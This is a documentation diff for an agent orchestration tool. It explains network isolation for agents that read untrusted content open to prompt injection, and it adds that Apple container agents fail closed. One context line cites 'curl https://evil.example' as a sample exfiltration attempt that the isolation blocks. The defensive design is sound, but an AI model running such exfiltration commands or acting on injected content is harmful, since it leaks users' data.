@@ -50,7 +50,7 @@ Otherwise a comma-separated exact-match allowlist.
 
 ## Agent network isolation
 
-Set `network: :isolated` in an agent's `config` when the agent ingests
+Set `network: :isolated` in a Docker or bwrap agent's `config` when the agent ingests
 **untrusted/external content** (web pages, third-party files, messages from
 outside users) — anything that can prompt-inject it:
 
@@ -65,8 +65,10 @@ orchestrator) and `curl https://evil.example` (exfiltration) both fail — only 
 LLM is reachable, and the destination is fixed by the host, not the agent. This
 prevents an injected agent from escalating into the swarm or exfiltrating data.
 
-Requires `socat` on the host. The default (`network: :open`) is unchanged. See
-[Backends](backends.md) for the per-backend mechanism.
+Requires `socat` on the host. The default (`network: :open`) is unchanged.
+Apple `container` agents reject `:isolated` and fail closed because the current
+CLI does not expose equivalent egress-forwarding semantics. See [Backends](backends.md)
+for the per-backend mechanism.
 
 ### Endpoint allowlist
 
